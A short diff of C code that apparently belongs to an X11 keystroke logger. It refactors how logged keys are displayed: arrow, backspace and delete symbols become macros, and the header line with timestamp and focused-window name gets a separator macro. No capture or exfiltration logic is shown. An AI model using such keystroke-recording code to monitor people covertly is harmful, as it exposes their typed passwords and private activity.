@@ -10,6 +10,15 @@
 #define XK_MISCELLANY
 #include <X11/keysymdef.h>
 
+#define SEPARATOR_PREFIX ">>>"
+
+#define VISUAL_BACKSPACE "\u232b"
+#define VISUAL_DELETE "\u2326"
+#define VISUAL_LEFT "\u2190"
+#define VISUAL_UP "\u2191"
+#define VISUAL_RIGHT "\u2192"
+#define VISUAL_DOWN "\u2193"
+
 struct keystroke_info
 {
     time_t timestamp;
@@ -39,31 +48,31 @@ static void process_event( const struct keystroke_info *info )
         break;
 
     case XK_BackSpace:
-        out = "\u232b";
+        out = VISUAL_BACKSPACE;
         break;
 
     case XK_Delete:
-        out = "\u2326";
+        out = VISUAL_DELETE;
         break;
 
     case XK_Left:
     case XK_KP_Left:
-        out = "\u2190";
+        out = VISUAL_LEFT;
         break;
 
      case XK_Up:
      case XK_KP_Up:
-        out = "\u2191";
+         out = VISUAL_UP;
         break;
 
     case XK_Right:
     case XK_KP_Right:
-        out = "\u2192";
+        out = VISUAL_RIGHT;
         break;
 
      case XK_Down:
      case XK_KP_Down:
-        out = "\u2193";
+         out = VISUAL_DOWN;
         break;
 
     default:
@@ -87,7 +96,8 @@ static void process_event( const struct keystroke_info *info )
         strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
                   localtime( &info->timestamp ) );
 
-        printf( "\n>>> %s : %s\n" , time_buf , info->focused_window_name );
+        printf( "\n" SEPARATOR_PREFIX " %s : %s\n" , time_buf ,
+                info->focused_window_name );
     }
 
     printf( "%s" , out );
